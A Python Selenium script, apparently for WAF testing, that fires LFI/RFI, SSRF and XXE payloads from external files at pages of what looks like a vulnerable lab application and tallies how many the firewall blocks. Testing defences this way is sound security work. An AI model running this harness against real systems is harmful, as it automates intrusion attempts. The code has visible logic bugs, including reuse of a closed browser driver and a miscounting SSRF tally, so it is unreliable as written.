import time
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException
from selenium.common.exceptions import NoSuchElementException
import requests
from utility import get_cookie_from_driver, calculate_file_lines, get_ip_addres_of_host


def execute(driver, target_url):
    # Start to attack
    lfi_rfi_attack(driver, target_url)
    ssrf_attack(driver, target_url)
    xxe_attack(driver, target_url)

def lfi_rfi_attack(driver, target_url):
    print(f"[+] Lfi / Rfi Injection Attacks")
    payload_path = './Payloads/LFI_RFI_Injections.txt'

    # Adjust URL Injection Speed if needed, Lower is quicker
    injection_speed = 1

    # Calculate Amount Of PayLoads
    lines = calculate_file_lines(payload_path)
    blocked_by_waf_counter = 0


    # Getting Payloads and starting to inject into WAF
    with open(payload_path, 'r', encoding='cp1252') as lfi_payloads:

        for payload in lfi_payloads:
            attack_url_page = target_url + f'directory_traversal_2.php?directory={payload}'
            time.sleep(injection_speed)
            driver.get(attack_url_page)
            try:
                # Catch WAF Blocking page
                waf_block_message = driver.find_element_by_xpath("/html/body/center/h1").text
                if "403 Forbidden" == waf_block_message:
                    blocked_by_waf_counter += 1
            except NoSuchElementException:
                print('[+] Path Traversal Attack passed: ', payload.strip())

    # for file in file_list:
    #     attack_url_page = target_url + f'directory_traversal_1.php?page={file}'
    #     driver.get(attack_url_page)
    #     try:
    #         # Catch WAF Blocking page
    #         waf_block_message = driver.find_element_by_xpath("/html/body/center/h1").text
    #         if "403 Forbidden" == waf_block_message:
    #             blocked_by_waf_counter += 1
    #     except NoSuchElementException:
    #         print('[+] Path Traversal Attack passed: ', file)

        time.sleep(injection_speed)
        print(f"\n[!] ~~~Local File Inclusion / Remote File Inclusion [LFI / RFI] Results~~~ [!]")
        print('Attacks Blocked by WAF: ', blocked_by_waf_counter)
        print(f"[+] Total Successful Attacks: ", lines - blocked_by_waf_counter)

    driver.quit()


def ssrf_attack(driver, target_url):

    """
        Issue with Statistics, it counts only 2 Passed attack while 4 Passed
        Lines of payloads = 32
        Attacks Blocked by WAF:  30
        [+] Total Successful Attacks:  2

        [+] SSRF Injection Attacks
        [+] Server Side Request passed:  ./evil/ssrf-1.txt
        [+] Server Side Request passed:  localtest.me
        [+] Server Side Request passed:  sub1.sub2.sub3.localtest.me
    """
    print(f"[+] SSRF Injection Attacks")

    payload_path = './Payloads/SSRF_Payloads.txt'
    MACHINE_IP = get_ip_addres_of_host(target_url)
    lines = calculate_file_lines(payload_path)
    injection_speed = 3
    blocked_by_waf_counter = 0

    # Getting Payloads and starting to inject into WAF

    driver.get(target_url + f'rlfi.php?language=lang_en.php&action=go')

    with open(payload_path, 'r', encoding='utf-8') as SSRF_payloads:
        for payload in SSRF_payloads:
            driver.get(target_url + f'rlfi.php?language={payload}&action=go?ip={MACHINE_IP}')

            try:
                WebDriverWait(driver, injection_speed).until(EC.alert_is_present())
                # If Alert: switch_to.alert for switching to alert and accept
                alert_popped = driver.switch_to.alert
                if alert_popped:
                    print('[+] Server Side Request passed: ', payload)
                    blocked_by_waf_counter += 1
                    time.sleep(injection_speed)
                    alert_popped.accept()

            except TimeoutException:
                try:
                    # Catch WAF Blocking page
                    waf_block_message = driver.find_element_by_xpath("/html/body/center/h1").text
                    if "403 Forbidden" == waf_block_message:
                        blocked_by_waf_counter += 1
                except NoSuchElementException:
                    print('[+] Server Side Request passed: ', payload)

    # Statistics #
    time.sleep(injection_speed)
    print(f"\n[!] ~~~Server Side Request Forgery [ SSRF ] Results~~~ [!]")
    print('Attacks Blocked by WAF: ',  blocked_by_waf_counter)
    print(f"[+] Total Successful Attacks: ", lines - blocked_by_waf_counter)
    driver.quit()

def xxe_attack(driver, target_url):

    """
        TODO: To check why I have one Payload which went threw with status code 200.
        Might be False positive?
    """

    print('[+] XXE Attack Start')

    payload_path = 'Payloads/XXE_Payloads.txt'


    injection_speed = 3
    blocked_by_waf_counter = 0

    driver.get(target_url + 'xxe-1.php')

    time.sleep(injection_speed)  # Wait Cookies To load
    driver_cookies = get_cookie_from_driver(driver)

    with open(payload_path, 'r', encoding='utf-8') as xxe_payloads:

        payloads = xxe_payloads.read().split('\n\n')
        lines = len(payloads)

        for payload in payloads:
            res = requests.post(target_url + '/xxe-1.php', cookies=driver_cookies, data=payload)
            if res.status_code == 200:
                print('[+] XML external entity passed: ', payload)
            else:
                blocked_by_waf_counter += 1


        # Statistics #
        time.sleep(injection_speed)
        print(f"\n[!] ~~~XML external entity [ XXE ] Results~~~ [!]")
        print('Attacks Blocked by WAF: ', blocked_by_waf_counter)
        print(f"[+] Total Successful Attacks: ", lines - blocked_by_waf_counter)
        driver.quit()
